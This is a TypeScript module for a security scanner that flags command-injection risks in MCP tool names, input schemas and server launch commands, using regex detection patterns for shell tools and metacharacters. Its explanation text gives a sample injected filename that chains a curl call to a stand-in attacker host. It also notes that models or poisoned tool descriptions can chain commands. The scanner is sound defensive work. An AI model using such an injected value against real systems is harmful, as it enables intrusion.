import type { Finding, ScanTarget, SecurityCheck } from "../types.js";
import { owasp } from "../../owasp/mapping.js";
import { makeFindingId, truncateSnippet } from "../utils.js";

const SHELL_TOOL_NAMES =
  /^(run|exec|execute|shell|bash|cmd|command|terminal|system|spawn|eval)$/i;

const SHELL_ARG_PATTERNS = [
  /\b(sh|bash|zsh|cmd|powershell|pwsh)\b/i,
  /\b(-c|--command)\b/,
  /\|\s*\w+/,
  /;\s*\w+/,
  /&&\s*\w+/,
  /\$\([^)]+\)/,
  /`[^`]+`/,
];

const CONCAT_RISK_PATTERNS = [
  { pattern: /exec\s*\(\s*[`'"]?\s*\+/, label: "string concatenation into exec" },
  { pattern: /spawn\s*\([^)]*\+/, label: "spawn with concatenation" },
  { pattern: /shell:\s*true/i, label: "shell: true flag" },
  { pattern: /os\.system\s*\(/, label: "os.system call" },
  { pattern: /subprocess\.(run|call|Popen)/, label: "subprocess without shell=False guarantee" },
];

export const commandInjectionCheck: SecurityCheck = {
  id: "command-injection",
  name: "Command injection surface",
  description:
    "Identifies tools and launch configs that expose shell execution or unsafe argument joining.",
  run(target: ScanTarget): Finding[] {
    const findings: Finding[] = [];

    for (const tool of target.tools) {
      if (SHELL_TOOL_NAMES.test(tool.name)) {
        findings.push({
          id: makeFindingId(),
          checkId: "command-injection",
          title: "Shell-style tool name",
          severity: "high",
          owasp: owasp("ASI05"),
          serverName: target.serverName,
          location: tool.sourcePath,
          snippet: tool.name,
          message: `Tool "${tool.name}" suggests direct command execution. Verify inputs are never passed to a shell.`,
          remediation:
            "Use allowlisted commands, structured argv arrays, and never interpolate user/model input into shell strings.",
          explanation:
            "Tools that wrap shell execution are the highest-risk MCP surface. A filename like report.pdf; curl attacker.com is a classic injection when passed to sh -c.",
          references: [
            "https://blog.trailofbits.com/2025/04/30/insecure-coding-practices-in-mcp/",
            "https://cwe.mitre.org/data/definitions/78.html",
          ],
          cwe: "CWE-78",
        });
      }

      const schemaText = JSON.stringify(tool.inputSchema ?? {});
      const riskyParams = ["command", "cmd", "shell", "script", "query", "path", "file", "filename"];
      for (const param of riskyParams) {
        if (schemaText.includes(`"${param}"`)) {
          const props = (tool.inputSchema as { properties?: Record<string, unknown> })?.properties;
          const field = props?.[param];
          if (!field) continue;
          const desc = JSON.stringify(field);
          if (SHELL_ARG_PATTERNS.some((p) => p.test(desc))) {
            findings.push({
              id: makeFindingId(),
              checkId: "command-injection",
              title: "User-controlled input may reach shell",
              severity: "critical",
              owasp: owasp("ASI05"),
              serverName: target.serverName,
              location: `${tool.sourcePath}.inputSchema.properties.${param}`,
              snippet: truncateSnippet(desc),
              message: `Tool "${tool.name}" accepts "${param}" and the schema suggests shell-like usage.`,
              remediation:
                "Validate and sanitize path/command parameters. Use execFile with a fixed binary and deny metacharacters ; | & $ `.",
              explanation:
                "When a tool accepts free-form command or path strings and passes them to the OS shell, the model (or a poisoned tool description) can chain arbitrary commands.",
              references: ["https://cwe.mitre.org/data/definitions/78.html"],
              cwe: "CWE-78",
            });
          }
        }
      }
    }

    if (target.commandLine) {
      for (const { pattern, label } of CONCAT_RISK_PATTERNS) {
        if (pattern.test(target.commandLine)) {
          findings.push({
            id: makeFindingId(),
            checkId: "command-injection",
            title: "Risky pattern in server launch command",
            severity: "medium",
            owasp: owasp("ASI05"),
            serverName: target.serverName,
            location: target.sourceFile,
            snippet: truncateSnippet(target.commandLine),
            message: `Launch configuration matches ${label}.`,
            remediation: "Audit server source for shell invocation with interpolated args.",
            explanation:
              "Static config cannot prove runtime behavior, but launch args that invoke shells are worth manual review.",
            references: [],
            cwe: "CWE-78",
          });
        }
      }

      if (/\bnpx\b/.test(target.commandLine) && /\$\{/.test(target.commandLine)) {
        findings.push({
          id: makeFindingId(),
          checkId: "command-injection",
          title: "Template interpolation in npx launch args",
          severity: "high",
          owasp: owasp("ASI05"),
          serverName: target.serverName,
          location: target.sourceFile,
          snippet: truncateSnippet(target.commandLine),
          message: "Environment or template variables in npx args can expand into unexpected shell tokens.",
          remediation: "Pin package versions and avoid templated shell fragments in MCP config.",
          explanation:
            "Config files sometimes use ${VAR} expansion. Combined with npx -y, this can pull and run unexpected package versions.",
          references: [],
          cwe: "CWE-78",
        });
      }
    }

    return findings;
  },
};
